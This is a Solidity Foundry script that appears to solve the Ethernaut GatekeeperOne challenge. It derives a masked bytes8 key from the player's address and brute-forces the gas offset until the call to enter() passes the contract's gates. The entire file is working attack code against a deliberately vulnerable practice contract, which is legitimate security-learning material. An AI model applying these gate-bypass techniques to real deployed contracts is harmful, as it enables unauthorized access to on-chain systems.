//SPDX-License-Identifer:UNLICENSED
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";

contract AttackGatekeeperOne {

    GatekeeperOne gateKeeperInstance;

    constructor(address target) {
        gateKeeperInstance = GatekeeperOne(target);
    }

    function attack(address player) public {
        bytes8 key = bytes8(uint64(uint160(player))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gateKeeperInstance).call{
                gas: 8191 * 10 + i
            }(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            if (success) {
                return; // stop immediately
            }
        }

        revert("Attack failed");
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne gateKeeperInstance = GatekeeperOne(0x7358B397eFa74Adc45d2397dcefb14580e2cD960);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackGatekeeperOne attackInstance = new AttackGatekeeperOne(address(gateKeeperInstance));
        attackInstance.attack(tx.origin);
        vm.stopBroadcast();
    }
}